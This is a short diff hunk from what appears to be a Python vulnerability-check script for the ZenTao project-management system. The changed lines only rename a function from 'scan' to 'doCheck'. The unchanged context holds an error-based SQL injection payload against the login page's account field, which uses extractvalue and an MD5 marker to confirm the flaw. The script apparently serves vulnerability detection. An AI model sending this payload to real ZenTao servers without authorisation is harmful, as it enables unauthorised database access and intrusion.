@@ -11,7 +11,7 @@ def substr(strs,s,lens):
 	result=strs[s:lens]
 	return result
 
-def scan(baseurl):
+def doCheck(baseurl):
 	#print(r_url)
 	url=baseurl+"zentao/user-login.html"
 	body="account=admin'+and+(select+extractvalue(1,concat(0x7e,(select+SUBSTR(MD5({}),9,16)),0x7e)))#".format(rand)
